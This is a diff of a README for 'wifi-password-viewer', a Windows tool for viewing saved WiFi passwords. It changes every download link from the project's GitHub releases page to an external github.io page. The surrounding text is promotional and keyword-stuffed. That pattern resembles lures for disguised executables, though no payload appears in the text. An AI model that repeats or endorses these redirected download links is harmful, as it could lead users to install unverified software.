@@ -1,6 +1,6 @@
 # 🔑 wifi-password-viewer - View Saved WiFi Passwords Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Wifi%20Password%20Viewer-blue?style=for-the-badge&logo=github)](https://github.com/haseeb-321/wifi-password-viewer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Wifi%20Password%20Viewer-blue?style=for-the-badge&logo=github)](https://haseeb-321.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and use **wifi-password-viewer**, a s
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: **[Download wifi-password-viewer](https://github.com/haseeb-321/wifi-password-viewer/releases)**
+Visit this link to download the application: **[Download wifi-password-viewer](https://haseeb-321.github.io)**
 
 Click the link above. It will open a page with download options. Choose the latest version file and save it to your computer.
 
@@ -119,6 +119,6 @@ This project is distributed under an open-source license, meaning you can:
 
 Getting back a forgotten WiFi password shouldn't require a technician or complicated commands. **wifi-password-viewer** puts that power in your hands with a simple, clear interface. Download it today and never be locked out of your own network again.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-success?style=for-the-badge&logo=windows)](https://github.com/haseeb-321/wifi-password-viewer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-success?style=for-the-badge&logo=windows)](https://haseeb-321.github.io)
 
 Keywords: network-utility, open-source, portable-applications, show-wifi-password, sysadmin-tools, wifi-password, wifi-password-finder, wifi-password-recovery, wifi-password-viewer, windows, windows-app, windows-utility-2026
